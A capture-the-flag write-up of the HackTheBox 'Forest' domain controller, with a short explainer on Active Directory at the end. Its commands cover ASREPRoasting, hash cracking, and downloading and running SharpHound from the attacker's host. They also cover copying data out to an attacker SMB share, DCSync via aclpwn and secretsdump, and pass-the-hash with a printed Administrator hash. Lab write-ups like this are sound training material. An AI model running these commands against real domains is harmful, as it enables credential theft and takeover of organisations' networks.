### Summary

- The machine has a **445 port leaking the users** on the machine.
- found user **(svc-alfresco**) with  *"**Kerberos pre-authentication required"*** not set, using **ASREPRoast** attack we got user hash.
- cracked the hash with hashcat and got the password,then logged in via evil-winRM.
- Discovered that the AD is misconfigured, adding a new user to **EXCHANGE WINDOWS PERMISSIONS ,** giving him **DCSync permission we can perform DCSync attack.**
- the **DCSync** attack is performed then got the **Administrator** hash.
- logged in using Evil-winRM using the **Administrator hash.**

### **1- Recon**

**1.1 Running Nmap.**

First we fire Nmap against the machine IP, doing a full-port TCP scan and service, OS detection then saving the output to a file *full-scan*

PS: Doing a full-port scan takes more time than normal scan does, but ensures that you don't miss anything.

    nmap -p- -A -T 4 -v -oA full-scan 10.10.10.161

From the output, we extracted some information.

1. The host is running on **Windows**.
2. **23** ports are opened**.**
3. From the services running we are dealing with an **Active Directory domain controller**.
4. the domain name is **htb.local**

Read **[ THIS ](#extra)** first if you don't know what Active Directory & Kerberos are and how they work.

### 2. Scanning

**2.1  Scanning port 445.** 

So what is this service, it is a network file sharing protocol. Simply allows sharing files/folders inside a network.

I am using enum4linux to enumerate this port. the tool just works around those tools (smbclient, rpclient, net and nmblookup) and prints the output from them.

PS: the tool's output is not that good,so you should read the output carefully.

    enum4linux -a 10.10.10.161

and the output will be something like this.

![/images/forest/enum4linux1.png](/images/forest/enum4linux1.png)

From the output we extracted some information.

- We got a list of **users** on the machine.
- There is **no shared folders for unauthenticated users.**
- we got a list of **Local groups / domain groups**

So let's test for another port.

**2.2 Scanning port 88**

Since we have a list of valid users we can try **ASREPRoast** attack.

( *The ASREPRoast attack looks for users without Kerberos pre-authentication required. That means that anyone can send an AS_REQ request to the KDC on behalf of any of those users, and receive an AS_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline ) [source](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/).*

I am using **GetNPUsers.py** from **[impacket](https://github.com/SecureAuthCorp/impacket/tree/master/examples)**  to perform this attack

    python GetNPUsers.py htb.local/ -usersfile users.txt -format hashcat -outputfile hashed -dc-ip 10.10.10.161

Options:

- [**htb.local**](http://htb.local) - is the domain name we extracted from the nmap output
- **-usersfile** - the list of users we want to test aginst // we extracted from enum4linux output
- **-format hashcat** - tells the tool to set the hash (if exists) to hashcat format so we crank it easilt
- **-outputfile** - the place to put the output in
- **-dc-ip -** the domain controller IP address

![/images/forest/getnp.png](/images/forest/getnp.png)

From the output it seems it didn't work but then you realize that you have an output file with big hash 

    $krb5asrep$23$svc-alfresco@HTB.LOCAL:14c0bc63892470b5a2246ad5456d61f8$11340938cc2f5070bce088816b5a70abb614dcceeaafb99e59788bb288b0b3ad0231b46ec4603d9ebac192028e8d7ac1042cedc80d38c048ba2e8a881f26c0d94d267a52cc59194f4c7b08bef5256198f73e3e9a60c3aa6f92623c12e0b7c4a425edbfbe72561eb97142c8853dea7f532589e7e03d61bbccddaff66bad8d4e1039384ceb364c9d95c1a6828fc9eb232a176f44c44844eed8d9eecf208e22617a46ee61881f9bfda2ab3b67428a43d76798299cda3de9b279b88e8d34e40ab62846252050d6c48870527f1208bf1fb67f17452b0813358c8cefb0df724ce323ba39e212065cbb

So it works, the user **svc-alfresco** doesn't have **pre-authentication required** and we got the hash so let's crack it.

    hashcat -m18200 hashed /usr/share/wordlists/rockyou.txt --force

Hashcat will be our tool, with some options

- -m18200 - tells the tool to use module number 18200 // every hash has its own hashcat module number you can see the modules list from **[here](https://hashcat.net/wiki/doku.php?id=example_hashes)**
- hashed - the name of file contains the hash.
- /usr/share/wordlist/rockyou.txt -  the wordlist hashcat will try to crack the hash against.
- - - force - it is optional just to ignore warnings about devices.

![/images/forest/hashcat.png](/images/forest/hashcat.png)

Hashcat cracked it, and the password is **s3rvice.**

So now we have valid username and password (svc-alfresco:s3rvice), but where can we use them to really access the machine ?

### 3. Gaining Access.

PS  (**Noobs** : Now what should you do ? you have a valid username and password. **Enumerate** .. got nothing **enumerate** more.

You can return to running services output from nmap. You will notice that there are many services you don't know about. google them and know what each service is and how can you pentest them if there is a chance. )

**3.1 Use WinRM to get access.**

So the port 5985 is open, and hosting winRM.

*(WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilizing WMI, so you can think of it as an HTTP based API for WMI.* 

Confused?, Simply it is a protocol allows you to manage a remote machine over HTTP(S)          // HTTPS is hosted frequently on port 5986

There is a tool called **[evil-winrm](https://github.com/Hackplayers/evil-winrm)**  on Linux that supports and perform some attack against WinRM.

    evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice

![/images/forest/evil.png](/images/forest/evil.png)

AND WE ARE IN! , and you can grab the **user** **flag** if you want :)

### 4. Elevate privileges.

**4.1 From svc-alfresco to Administrator.**

Since we are in Active Directory Domain, it is the time to walk the dog. 

**Bloodhound** will reveal hidden and often unintended relationships within an Active Directory environment, giving you the shortest attack paths.

first you need to install bloodhound on your machine 

    sudo apt install bloodhound
    git clone https://github.com/BloodHoundAD/BloodHound.git

then setup a python server in  this directory **/BloodHound/Ingestors/**  then  download it from the machine and execute/import it.

    powershell iwr -outf Sharphound.ps1 [http://10.10.14.17:8000/SharpHound.ps1](http://10.10.14.17:8000/SharpHound.ps1)
    .\SharpHound.ps1
    Import-module .\SharpHound.ps1
    

    Invoke-BloodHound -Domain htb.local -LDAPUser svc-alfresco -LDAPPass s3rvice -CollectionMethod All -DomainController htb.local -ZipFileName forest.zip

![/images/forest/forest.png](/images/forest/forest.png)

So what are these options for:

- -Domain - Is the domain we want to gather objects from. which is in our case is htb.local
- -LDAPUser/LDAPPass - are the username/password of the the user in the specified domain.
- -DomainController - Specifiy the domain controller.
- -CollectionMethod All -  Tells bloodhound to collect all possible information about object(Users/Computers/Domains/Groups/..) in the current domain.
- -ZipFileName - specify the name of the zip output.

Now we have a forest.zip file, we need to transfer it to our machine. You can use impacket-smbserver on you machine to setup a shared folder then you can copy the ZIP from the machine to you shared folder.

**Setup** **a shre** **on your machine:**

    impacket-smbserver files ~/Desktop      //files is the name of the share  , ~/Desktop is the path of the share to add

**Copy the ZIP to you machine , from the forest machine:**

    cp forest.zip \\<your_ip>\<name_of_share>

Now you have the forest.zip on your Desktop.

### **Exploring the forest**

Start neo4j service 

    sudo service neo4j console
    bloodhound

Upload the [forest.zip](http://forest.zip) file to bloodhound

Bloodhound has built-in queries you can choose from, we are going to use "  find the shortest path to domain admin"

![/images/forest/blood2.png](/images/forest/blood2.png)

- So svc-alfresco user is in **SERVICE ACCOUNT** group
- and this group is a member of **PRIVILEGED IT ACCOUNT** group which is a member of **ACCOUNT OPERATORS** group.
- And the **ACCOUNT OPERATORS**  group has **GenericALL** permission(allows us to DO ANYTHING TO THIS GROUP GenericAll = Full Control) over **EXCHANGE WINDOWS PERMISSIONS** group
- so svc-alfresco has **GenericALL** permission over **EXCHANGE WINDOWS PERMISSIONS**
- **EXCHANGE WINDOWS PERMISSIONS** Has **WriteDACL** permission over the domain(provides the ability to modify security on an object which can lead to Full Control of the object).

Attack Steps: 

1- **direct from the svc-alfresco to Administrator  (NOTE:This will ruin the box for the other users on HTB)**

so use Iam going to use **aclpwn.py** which will automate:

1- adding the **svc-alfresco** user to **EXCHANGE WINDOWS PERMISSIONS group.**

2- giving the **svc-alfresco** user **DCSync** permission on the domain.

    python3 ../../aclpwn.py/aclpwn.py -f svc-alfresco -ft user -d htb.local -du neo4j -dp admin -sp s3rvice

![/images/forest/acl.png](/images/forest/acl.png)

You must specify your neo4j username/password so aclpwn can grab the objects to select an attack path, then automate the exploitation.

since we got the DCSync permission we can get the hash of everyone (Administrator included).

    python3 secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161

![/images/forest/ADMIN.png](/images/forest/ADMIN.png)

2- So we are going to creat a new user then add this user to **EXCHANGE WINDOWS PERMISSIONS group. (Recommended)**

    net user notevil notevil1 /add /domain
    net group "EXCHANGE WINDOWS PERMISSIONS" notevil /add /domain

we now can run Bloodhound again on the machine and repeat the same steps, then use the new user creds to grab the AD hash using the secretsdump.

    python3 secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161

Evil-winRM allows auth using the hash and username

    evil-winrm -i 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6

#### Rooted!

### Extra:

### What is **Active Directory** and how it works ?

Active Directory (AD) is a Microsoft technology used to manage computers and other devices on a network.

Active Directory allows network administrators to create and manage domains, users, and objects within a network. 

For example, an admin can create a group of users and give them specific access privileges to certain directories on the server. As a network grows, Active Directory provides a way to organize a large number of users into logical groups and subgroups, while providing access control at each level.

**AD Components: (There are more components but those are the most important to know)**

1. **Physical Components**
    - ***DC (Domain Controller):***
        - It is a server that contain all the AD Store
        - Provide Authentication and Authorization services
        - Allow Administrative access to manage user accounts and network resource.

    - ***AD-DS (Data Store)**:*
        - It contains all **database files and process that store and manage directory information for users,service,and applications**

2. **Logical Elements**
    - ***AD-SCHEMA***
        - It defines every type of object that can be stored in the directory.
        - it hold somethings like classes and every class has attributes and objects can inherit from it.

        ![/images/forest/ad-schema.gif](/images/forest/ad-schema.gif)

        - ***Domains***
            - are used to group and manage objects(Users,Group,Application,Device) in an organization

            ![/images/forest/domain.png](/images/forest/domain.png)

        - ***Trees***
            - consists of a parent domain and child domains.

                ![/images/forest/tree.png](/images/forest/tree.png)

        - ***Forests***
            - it is a collection of the trees.

            ![/images/forest/forest.jpg](/images/forest/forest.jpg)

- ***Trusts:***
    - Provide mechanism for users to gain access to resources in another domain.
    - all domains in a forest trust all other domains in the forest.
    - trusts can extend outside the forest.

    ![/images/forest/trust3.png](/images/forest/trust3.png)

### Attacking methodology ?

Who is logged in where ?

Who can admin what ? 

Who is in what groups? 

Active Directory uses **Kerberos** as an authentication protocol.

Read this awesome series by ***Eloy Pérez*** to know more about Kerberos and authentication process.
